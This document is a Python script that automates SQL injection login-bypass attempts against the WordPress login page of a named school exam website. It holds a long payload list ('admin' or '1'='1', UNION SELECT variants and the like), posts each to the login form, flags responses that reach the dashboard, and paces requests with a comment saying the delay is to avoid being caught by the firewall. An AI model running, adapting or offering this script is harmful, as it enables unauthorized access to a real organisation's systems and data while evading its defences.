import requests
import time

target = "https://ujian.smpn2jayapura.my.id/wp-login.php"  # GANTI URL WP kamu
log_file = "wp_final_sqli_log.txt"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                  "AppleWebKit/537.36 (KHTML, like Gecko) "
                  "Chrome/122.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Referer": target,
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1"
}

payloads = [
    "-", " ", "&", "^", "*",
    " or ''-", " or '' ", " or ''&", " or ''^", " or ''*",
    '-', ' ', '&', '^', '*',
    ' or ""-', ' or "" ', ' or ""&', ' or ""^', ' or ""*',
    "or true--", '" or true--', "' or true--", '") or true--', "') or true--",
    "' or 'x'='x", "') or ('x')=('x", "')) or (('x'))=(('x",
    '" or "x"="x', '") or ("x")=("x', '")) or (("x"))=(("x',
    "or 1=1", "or 1=1--", "or 1=1#", "or 1=1/*",
    "admin' --", "admin' #", "admin'/*", "admin' or '1'='1",
    "admin' or '1'='1'--", "admin' or '1'='1'#", "admin' or '1'='1'/*",
    "admin'or 1=1 or ''='", "admin' or 1=1", "admin' or 1=1--",
    "admin' or 1=1#", "admin' or 1=1/*", "admin') or ('1'='1",
    "admin') or ('1'='1'--", "admin') or ('1'='1'#", "admin') or ('1'='1'/*",
    "admin') or '1'='1", "admin') or '1'='1'--", "admin') or '1'='1'#",
    "admin') or '1'='1'/*",
    '1234 \' AND 1=0 UNION ALL SELECT \'admin\', \'81dc9bdb52d04dc20036dbd8313ed055',
    'admin" --', 'admin" #', 'admin"/*', 'admin" or "1"="1',
    'admin" or "1"="1"--', 'admin" or "1"="1"#', 'admin" or "1"="1"/*',
    'admin"or 1=1 or ""="', 'admin" or 1=1', 'admin" or 1=1--',
    'admin" or 1=1#', 'admin" or 1=1/*', 'admin") or ("1"="1',
    'admin") or ("1"="1"--', 'admin") or ("1"="1"#', 'admin") or ("1"="1"/*',
    'admin") or "1"="1', 'admin") or "1"="1"--', 'admin") or "1"="1"#',
    'admin") or "1"="1"/*',
    '1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055'
]

def write_log(msg):
    print(msg)
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(msg + "\n")

def test_sqli():
    for p in payloads:
        data = {
            "log": p,
            "pwd": "test",
            "wp-submit": "Log In",
            "redirect_to": target.replace("wp-login.php", "wp-admin/"),
            "testcookie": "1"
        }
        try:
            r = requests.post(target, headers=headers, data=data, timeout=10, allow_redirects=True)
            log = f"[{r.status_code}] Payload: {p} | Final URL: {r.url}"
            if "wp-admin" in r.url or "Dashboard" in r.text:
                log += " ==> [!!! BYPASS MUNGKIN BERHASIL]"
            else:
                log += " ==> [Gagal]"
            write_log(log)
        except Exception as e:
            write_log(f"[!] ERROR pakai payload: {p} | {e}")
        time.sleep(1.5)  # Delay biar ga langsung ketangkep WAF

write_log("=== MULAI WP SQLi FINAL TEST ===")
test_sqli()
write_log("=== SELESAI ===")
